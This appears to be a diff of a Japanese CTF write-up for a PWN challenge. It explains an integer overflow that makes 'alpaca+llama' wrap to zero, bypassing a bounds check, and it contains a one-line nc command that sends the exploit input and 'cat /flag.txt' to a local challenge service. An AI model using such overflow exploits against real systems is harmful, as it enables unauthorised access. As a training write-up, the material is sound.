@@ -21,7 +21,7 @@ SIGSEGV を発生させれば shell に execve される PWN 問題です。
 
 とすれば `alpaca+llama` はオーバーフローして `0` になり、チェックをすり抜けて範囲外アクセスができます。
 
-## 回答に使用したコード
+## 解答に使用したコード
 
 ```bash
 (echo $((2 ** 32 - 1)); echo 1; yes 0 | head -n 600; echo "cat /flag.txt") | nc localhost 1337
